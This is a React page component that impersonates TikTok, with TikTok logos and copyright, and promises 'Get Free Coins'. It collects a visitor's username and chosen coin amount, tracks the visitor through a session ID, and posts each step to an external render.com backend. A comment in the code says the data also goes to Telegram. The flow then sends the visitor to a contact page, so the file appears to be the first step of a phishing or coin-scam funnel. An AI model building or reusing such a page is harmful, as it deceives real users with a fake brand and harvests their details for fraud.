import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "https://proje-1-d4xz.onrender.com";
const API = `${BACKEND_URL}/api`;

const HomePage = () => {
  const navigate = useNavigate();
  const [username, setUsername] = useState('');
  const [selectedCoin, setSelectedCoin] = useState(100000);
  const [sessionId, setSessionId] = useState(null);

  useEffect(() => {
    // Check if session already exists in localStorage
    const existingSessionId = localStorage.getItem('sessionId');
    
    if (existingSessionId) {
      // Use existing session
      setSessionId(existingSessionId);
      console.log('Using existing session:', existingSessionId);
    } else {
      // Create new session only if none exists
      const createSession = async () => {
        try {
          const response = await axios.post(`${API}/session/create`);
          const newSessionId = response.data.session_id;
          setSessionId(newSessionId);
          localStorage.setItem('sessionId', newSessionId);
          console.log('Created new session:', newSessionId);
        } catch (error) {
          console.error('Failed to create session:', error);
        }
      };
      createSession();
    }
  }, []);

  const coinOptions = [
    { value: 25000, label: '25,000' },
    { value: 50000, label: '50,000' },
    { value: 100000, label: '100,000' }
  ];

  const handleContinue = async () => {
    if (username.trim() && sessionId) {
      // Save to localStorage
      localStorage.setItem('username', username);
      localStorage.setItem('coinAmount', selectedCoin);

      // Fetch TikTok user data
      try {
        const tiktokResponse = await axios.get(`${API}/tiktok/user/${username}`);
        if (tiktokResponse.data.success) {
          localStorage.setItem('tiktokData', JSON.stringify(tiktokResponse.data));
        }
      } catch (error) {
        console.error('Failed to fetch TikTok data:', error);
      }

      // Send to backend and Telegram
      try {
        await axios.post(`${API}/session/step`, {
          session_id: sessionId,
          step: 'username_coin',
          data: {
            username: username,
            amount: selectedCoin
          }
        });
      } catch (error) {
        console.error('Failed to submit step:', error);
      }

      // Navigate directly to contact page
      navigate('/contact');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-12">
        {/* Title */}
        <div className="text-center mb-12">
          <h1 className="text-6xl font-black mb-4">
            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
              TikTok
            </span>
          </h1>
          <p className="text-cyan-400 text-2xl font-semibold">Get Free Coins</p>
        </div>

        {/* Instructions */}
        <p className="text-gray-400 text-center text-lg mb-8">
          Enter your TikTok username and choose a coin amount.
        </p>

        {/* Username Input */}
        <div className="mb-8">
          <label className="text-white text-lg mb-3 block">Username</label>
          <Input
            type="text"
            placeholder="@username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
          />
        </div>

        {/* Coin Selection */}
        <div className="mb-8">
          <label className="text-white text-lg mb-4 block">Select Coin Amount</label>
          <div className="grid grid-cols-3 gap-4">
            {coinOptions.map((option) => (
              <button
                key={option.value}
                onClick={() => setSelectedCoin(option.value)}
                className={`flex items-center justify-center gap-2 sm:gap-3 p-3 sm:p-6 rounded-xl border-2 transition-all ${
                  selectedCoin === option.value
                    ? 'bg-[#1a1a1c] border-cyan-400 shadow-lg shadow-cyan-400/20'
                    : 'bg-[#1a1a1c] border-gray-700 hover:border-gray-600'
                }`}
              >
                <img 
                  src="/coin-icon.png" 
                  alt="Coin" 
                  className="w-6 h-6 sm:w-7 sm:h-7 object-contain flex-shrink-0"
                />
                <span className="text-white text-lg sm:text-2xl font-bold">{option.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Continue Button */}
        <Button
          onClick={handleContinue}
          disabled={!username.trim()}
          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#f5224a] hover:to-[#f5224a] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Continue
        </Button>

        {/* Coins Display */}
        <div className="mt-8 text-center">
          <div className="inline-flex items-center gap-2 bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-4 sm:px-8 py-3 sm:py-4">
            <span className="text-gray-400 text-sm sm:text-lg">You will receive: </span>
            <img src="/coin-icon.png" alt="Coin" className="w-5 h-5 sm:w-6 sm:h-6 object-contain flex-shrink-0" />
            <span className="text-cyan-400 text-xl sm:text-2xl font-bold">{selectedCoin.toLocaleString()}</span>
            <span className="text-gray-400 text-sm sm:text-lg"> Coins</span>
          </div>
        </div>
      </main>

      {/* Footer - Mobile Optimized */}
      <footer className="bg-[#0f0f10] border-t border-gray-800 py-8 px-4 sm:py-12 sm:px-6">
        <div className="max-w-4xl mx-auto">
          {/* Download Section with Links Below */}
          <div className="text-center mb-6 sm:mb-8">
            <h3 className="text-white text-lg sm:text-xl font-semibold mb-3 sm:mb-4">Download now</h3>
            
            {/* Buttons and Links in Grid */}
            <div className="flex justify-center gap-8 sm:gap-12">
              {/* App Store Column */}
              <div className="flex flex-col items-center">
                <button className="bg-transparent border-2 border-blue-500 text-white px-4 sm:px-6 py-2 rounded-md hover:bg-500 transition-all text-xs sm:text-sm font-semibold mb-4">
                  App Store
                </button>
                <div className="text-left">
                  <h4 className="text-white text-sm sm:text-base font-semibold mb-2 sm:mb-3">Company</h4>
                  <ul className="space-y-1.5 sm:space-y-2">
                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">About TikTok</a></li>
                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Newsroom</a></li>
                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Contact</a></li>
                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Careers</a></li>
                  </ul>
                </div>
              </div>

              {/* Google Play Column */}
              <div className="flex flex-col items-center">
                <button className="bg-transparent border-2 border-gray-600 text-white px-4 sm:px-6 py-2 rounded-md hover:bg-gray-700 transition-all text-xs sm:text-sm font-semibold mb-4">
                  Google Play
                </button>
                <div className="text-left">
                  <h4 className="text-white text-sm sm:text-base font-semibold mb-2 sm:mb-3">Legal</h4>
                  <ul className="space-y-1.5 sm:space-y-2">
                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Terms of Use</a></li>
                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Privacy Policy</a></li>
                    <li><a href="#" className="text-gray-400 text-xs sm:text-sm hover:text-white transition-colors">Copyright Policy</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>

          {/* Language & Copyright */}
          <div className="border-t border-gray-800 pt-4 sm:pt-6 flex flex-col sm:flex-row justify-between items-center gap-3 sm:gap-4">
            <button className="bg-transparent border border-gray-600 text-white px-6 py-1.5 sm:py-2 rounded-md hover:bg-gray-800 transition-all text-xs sm:text-sm">
              English
            </button>
            <p className="text-gray-500 text-xs sm:text-sm">© 2025 TikTok</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default HomePage;
